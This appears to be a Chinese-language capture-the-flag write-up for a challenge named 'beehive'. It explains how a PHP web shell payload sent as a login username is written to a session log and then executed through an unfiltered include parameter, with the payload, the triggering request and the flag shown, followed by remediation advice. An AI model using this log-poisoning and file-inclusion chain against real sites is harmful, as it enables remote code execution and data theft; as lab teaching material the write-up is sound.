# beehive

## 题目简述

登录失败时，PHP 把用户提供的 username 原样写入当前会话的日志文件；首页又允许通过 include 参数包含相对路径，只过滤 .. 和绝对路径。把 PHP 代码写入日志再包含该日志，即可完成日志投毒到本地文件包含的代码执行。

## 解题过程

以 PHP 代码作为用户名、任意非空字符串作为密码提交：

~~~php
<?php system('cat /flag'); ?>
~~~

login.php 会把它写成 login failed for ...，响应页面同时给出本会话随机日志路径，例如 log/<随机值>.log。保持同一会话 cookie，请求：

~~~text
/index.php?include=log/<随机值>.log
~~~

include 会把日志按 PHP 解析，system 读取 /flag，返回：

~~~text
maple{l0gg1ng_t0_cwd_5mh}
~~~

## 方法总结

LFI 与可控日志组合会升级为代码执行。随机日志名不是安全边界，因为页面主动泄漏路径；路径过滤也没有限制到允许文件列表。修复应避免动态 include，日志写入时做结构化编码，并把日志放在 Web/PHP 无法执行的位置。
